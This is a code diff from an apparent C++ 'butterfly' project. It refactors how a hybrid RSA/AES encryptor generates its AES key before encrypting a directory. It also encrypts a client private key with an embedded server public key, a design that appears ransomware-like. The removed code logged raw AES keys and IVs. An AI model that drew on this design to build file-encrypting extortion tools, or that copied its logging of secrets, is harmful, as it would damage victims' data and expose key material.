@@ -7,7 +7,7 @@ namespace butterfly
 namespace hybrid
 {
 
-Encryptor::Encryptor(int keySize) : _keySize(keySize), _aesKeyInit(false),
+Encryptor::Encryptor(int keySize) : _keySize(keySize),
                                     _rsaEncryptorAESKey(new rsa::RSAEncryptor(_keySize)),
                                     _rsaEncryptorCPrivateRSA(new rsa::RSAEncryptor(rsa::SPUBLIC_PEM)),
                                     _aesEncryptor(new aes::AESEncryptor())
@@ -15,31 +15,6 @@ Encryptor::Encryptor(int keySize) : _keySize(keySize), _aesKeyInit(false),
     #ifdef LOGGING
     LOG_TRACE("Create class Encryptor");
     #endif
-}
-
-void Encryptor::validateAESKeyLength()
-{
-    std::string aeskey, aesiv, aeskeypair;
-    do
-    {
-
-        if ( _aesKeyInit )
-        {
-            sleep(1);
-            _aesEncryptor->generateAESKeyWithSalt();
-        }
-
-        aeskey = _aesEncryptor->getAESKey();
-        aesiv = _aesEncryptor->getAESIv();
-        aeskeypair = _aesEncryptor->getAESKeyPair();
-        #ifdef LOGGING
-        LOG_TRACE("Generated AESKey: " << aeskey << " with Length: " << aeskey.length() << " and AESIV: " <<  aesiv << " with Length: " << aesiv.length() << " and AESKeyPairLength: " << aeskeypair.length());
-        #endif
-        _aesKeyInit = true;
-
-    }
-    while ( (aeskey.length() < 32) or (aesiv.length() < 16));
-
 }
 
 void Encryptor::saveUnencryptedAESKeyPair(const std::string &aesKeyPair)
@@ -91,10 +66,17 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // Encrypt the CPrivateRSA.pem String to CPrivateRSA.bin
     encryptCPrivateRSA();
 
-    if ( !aes::AESEncryptor::initDone() )
+
+    if ( !aes::AESEncryptor::isInitialized() )
     {
-        // Generate and validate the AES Key and IV
-        validateAESKeyLength();
+
+        bool rc = _aesEncryptor->generateAESKeyWithSalt();
+
+        if ( !rc && (!_aesEncryptor->isInitialized()) )
+        {
+            throw AESEncryptionException("Error on initializing the AESKey with SALT!");
+        }
+
     }
 
     // Get the AESKeyPair(AESKey + AESIV)
